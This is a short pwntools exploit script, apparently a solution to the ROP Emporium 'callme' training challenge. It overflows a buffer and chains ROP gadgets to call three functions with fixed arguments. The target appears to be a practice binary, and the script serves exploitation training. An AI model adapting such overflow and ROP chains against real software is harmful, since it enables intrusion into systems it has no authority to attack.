from pwn import *

elf = context.binary = ELF("./callme")
r = process()

call1 = p64(elf.sym["callme_one"])
call2 = p64(elf.sym["callme_two"])
call3 = p64(elf.sym["callme_three"])

arg1 = p64(0xdeadbeefdeadbeef)
arg2 = p64(0xcafebabecafebabe)
arg3 = p64(0xd00df00dd00df00d)

POP_RDI = p64(0x00000000004009a3)
POP_RSI_RDX = p64(0x000000000040093d)

set_args = POP_RDI + arg1 + POP_RSI_RDX + arg2 + arg3 #sets arguments according to calling convention

payload = b"A"*40 + set_args + call1 + set_args + call2 + set_args + call3

r.sendline(payload)

r.interactive()